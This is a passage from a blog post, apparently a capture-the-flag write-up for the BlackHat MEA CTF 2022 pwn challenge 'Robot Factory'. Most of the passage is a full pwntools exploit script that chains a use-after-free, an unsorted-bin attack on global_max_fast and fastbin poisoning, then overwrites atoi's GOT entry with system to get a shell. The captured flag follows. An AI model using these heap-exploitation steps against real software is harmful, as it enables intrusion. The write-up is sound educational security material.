+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./main_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./libc-2.27.so&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./ld-2.27.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>binary <span style="color:#555">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([exe<span style="color:#555">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        url <span style="color:#555">=</span> <span style="color:#c30">&#39;blackhat2-ea1a9ec94289cd9df8e692f6ce7c828e-0.chals.bh.ctf.sa&#39;</span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(url, <span style="color:#f60">443</span>, ssl<span style="color:#555">=</span><span style="color:#069;font-weight:bold">True</span>, sni<span style="color:#555">=</span>url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create</span>(r, size):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;size:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#366">str</span>(size)<span style="color:#555">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit</span>(r, idx, payload):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;slot:&#39;</span>, <span style="color:#366">str</span>(idx)<span style="color:#555">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;robot:&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">free</span>(r, idx):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;slot:&#39;</span>, <span style="color:#366">str</span>(idx)<span style="color:#555">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Due to no leak, we bruteforce 12 bit of the heap offset and 12 bit of the libc base</span>
+</span></span><span style="display:flex;"><span>global_max_fast <span style="color:#555">=</span> <span style="color:#f60">0xf940</span>
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#555">=</span> <span style="color:#f60">0xa31420</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Fill tcache[0x110] until it got full</span>
+</span></span><span style="display:flex;"><span>tcache_size <span style="color:#555">=</span> <span style="color:#f60">0x108</span>
+</span></span><span style="display:flex;"><span>offset_increment <span style="color:#555">=</span> <span style="color:#f60">0x260</span> <span style="color:#09f;font-style:italic"># Based on gdb observation, when we create the first chunk, the offset will be heap_offset + 0x260</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">7</span>): <span style="color:#09f;font-style:italic"># We can do this because calloc doesn&#39;t use tcache</span>
+</span></span><span style="display:flex;"><span>    create(r, tcache_size)
+</span></span><span style="display:flex;"><span>    free(r, <span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;Fulfill tcache...&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create two chunk with size 0x108</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># These will be used later</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">2</span>):
+</span></span><span style="display:flex;"><span>    create(r, tcache_size)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create huge chunk</span>
+</span></span><span style="display:flex;"><span>max_size <span style="color:#555">=</span> <span style="color:#f60">0x2700</span>
+</span></span><span style="display:flex;"><span>create(r, max_size)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create small chunk, so that when we free huge chunk, it won&#39;t get consolidated</span>
+</span></span><span style="display:flex;"><span>create(r, <span style="color:#f60">0x111</span>)
+</span></span><span style="display:flex;"><span>create(r, <span style="color:#f60">0x111</span>) <span style="color:#09f;font-style:italic"># This will be used as fake chunk later. We need to set the size to 0x111</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(r, <span style="color:#f60">2</span>) <span style="color:#09f;font-style:italic"># Go to unsorted bin</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;Now we have unsorted bin chunk&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># With UAF, modify the unsorted bin chunk bk to the global_max_fast-0x10</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> p64(<span style="color:#f60">0</span>) <span style="color:#555">+</span> p64(global_max_fast<span style="color:#555">-</span><span style="color:#f60">0x10</span>)[:<span style="color:#f60">2</span>]
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">2</span>, payload)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;Now bk point to global_max_fast&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now this create will overwrite global_max_fast to random huge value</span>
+</span></span><span style="display:flex;"><span>create(r, max_size)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;global_max_fast got overwritten&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now, when we free our previous three chunks, it will go to fastbin</span>
+</span></span><span style="display:flex;"><span>free(r,<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>free(r,<span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;Now, we have fastbin chunk with size 0x110&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># We are going to overwrite atoi got with system</span>
+</span></span><span style="display:flex;"><span>atoi_got <span style="color:#555">=</span> exe<span style="color:#555">.</span>got[<span style="color:#c30">&#39;atoi&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;atoi address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(atoi_got)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Points to the size of robots[4]</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Remember that fastbin is pretty strict with its chunk size, which is why we previously set</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># The robots[4] size to 0x111, so that this can be used as a fake fastbin chunk with size 0x110</span>
+</span></span><span style="display:flex;"><span>robot_memory_size_offset <span style="color:#555">=</span> <span style="color:#f60">0x4040c8</span>
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">0</span>,p64(robot_memory_size_offset)) <span style="color:#09f;font-style:italic"># UAF,overwrite fastbin pointer to the robot memory size offset</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>create(r, tcache_size)
+</span></span><span style="display:flex;"><span>create(r, tcache_size) <span style="color:#09f;font-style:italic"># Now robot[1] point to the desired offset. We now have arbitrary write</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Now, robots[1] point to the desired offset&#39;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> p64(<span style="color:#f60">1</span>)<span style="color:#555">*</span><span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(<span style="color:#f60">1</span>)<span style="color:#555">*</span><span style="color:#f60">3</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(atoi_got) <span style="color:#09f;font-style:italic"># Set robots[0] to atoi GOT</span>
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">1</span>,payload) <span style="color:#09f;font-style:italic"># Arbitrary write</span>
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">0</span>,p64(system_offset)[:<span style="color:#f60">3</span>]) <span style="color:#09f;font-style:italic"># Partial overwrite atoi to system</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Now, atoi is changed to system&#39;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive() <span style="color:#09f;font-style:italic"># Now, enter sh, and atoi(input) will be system(&#34;sh&#34;)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><code>Flag: BlackHatMEA{1246:23:a4ea71cd5cedf7bd35ff38a9874dd95e04b1153a}</code></p>
+</blockquote>
+<h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>
+
+      </div>
+      
+        
+  <aside class="toc-container">
+    <a href="#" style="font-weight: 700; color: black;">BlackHat MEA CTF 2022</a>
+    <div class="js-toc">
+      <details>
+          <summary>Table of Contents
+          </summary>
+          <div>
+              <nav id="TableOfContents">
+  <ul>
+    <li><a href="#robot-factory">Robot Factory</a>
+      <ul>
+        <li><a href="#initial-analysis">Initial Analysis</a></li>
+        <li><a href="#exploitation-plan">Exploitation Plan</a></li>
+        <li><a href="#detailed-solution">Detailed Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+          </div>
+      </details>
+    </div>
+  </aside>
+
+
+      
+    </div>
+
+    
+        <div class="tags">
+            
+                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
+            
+                <a href="https://chovid99.github.io/tags/blackhat">BlackHat</a>
+            
+                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
+            
+                <a href="https://chovid99.github.io/tags/heap">heap</a>
+            
+                <a href="https://chovid99.github.io/tags/unsorted-bin">unsorted bin</a>
+            
+                <a href="https://chovid99.github.io/tags/fastbin">fastbin</a>
+            
+        </div>
+    
+    
+    
+  <div id="comment">
+    
+    
+  </div>
+
+
+</section>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="/js/tocbot.min.js"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+      
+      tocSelector: '.js-toc',
+      
+      contentSelector: '.js-toc-content',
+      headingSelector: 'h1, h2, h3',
+      orderedList: false,
+      headingLabelCallback: s => s.substr(0, s.length-2),
+      collapseDepth: 2
+  });
+  function initTOC() {
+    var windowWidth = 1316;
+    var $block_2 = $(".toc-container");
+    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
+    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
+  }
+  window.onload = initTOC;
+
+  var lastWindowWidth = $(window).width();
+  $(window).resize(function() {
+    var $block_2 = $(".toc-container");
+    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
+    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
+    lastWindowWidth = $(window).width();
+  });
+</script>
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
+		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
+		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
+		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
+		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
+		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
+		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
+		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
+		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
+		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
+		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
+		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
+		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
+		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
+</g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+       © Copyright 
+       2022 
+       <span class="split">
+        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
+  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
+</svg>
+       </span>
+       Chovid99
+    
+    </div>
+
+    
+</footer>
+
+
+
+  </body>
+</html>
